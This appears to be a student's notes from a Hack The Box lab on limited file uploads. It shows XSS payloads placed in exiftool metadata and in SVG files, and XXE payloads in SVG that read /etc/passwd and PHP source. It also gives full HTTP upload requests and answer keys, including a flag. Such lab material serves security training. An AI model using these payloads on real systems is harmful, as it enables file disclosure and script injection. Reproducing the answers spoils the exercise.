# Limited File Uploads
## XSS
Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters, as follows:

```
$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

XSS via SVG (images are XML-based, and they describe 2D vector graphics, which the browser renders into an image):

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

## XXE
With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

## Questions
1. The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt" **Answer: HTB{my_1m4635_4r3_l37h4l}**
   - Upload this SVG with XXE payload:
        ```
        POST /upload.php HTTP/1.1
        Host: 154.57.164.80:32668
        Content-Length: 308
        X-Requested-With: XMLHttpRequest
        Accept-Language: en-US,en;q=0.9
        Accept: */*
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLGsWij3MTKreOGxN
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Origin: http://154.57.164.80:32668
        Referer: http://154.57.164.80:32668/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ------WebKitFormBoundaryLGsWij3MTKreOGxN
        Content-Disposition: form-data; name="uploadFile"; filename="test.svg"
        Content-Type: image/svg+xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
        <svg>&xxe;</svg>

        ------WebKitFormBoundaryLGsWij3MTKreOGxN--
        ```
   - `Ctrl` + `U` to view the flag in the source code
2. Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes) **Answer: ./images/**
   - Use PHP filter wrapper to read the source code of `upload.php` base64 encoded:
        ```
        POST /upload.php HTTP/1.1
        Host: 154.57.164.80:32668
        Content-Length: 346
        X-Requested-With: XMLHttpRequest
        Accept-Language: en-US,en;q=0.9
        Accept: */*
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLGsWij3MTKreOGxN
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Origin: http://154.57.164.80:32668
        Referer: http://154.57.164.80:32668/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ------WebKitFormBoundaryLGsWij3MTKreOGxN
        Content-Disposition: form-data; name="uploadFile"; filename="test.svg"
        Content-Type: image/svg+xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
        <svg>&xxe;</svg>

        ------WebKitFormBoundaryLGsWij3MTKreOGxN--
        ```
   - Decode the code placed in the source code to read the upload directory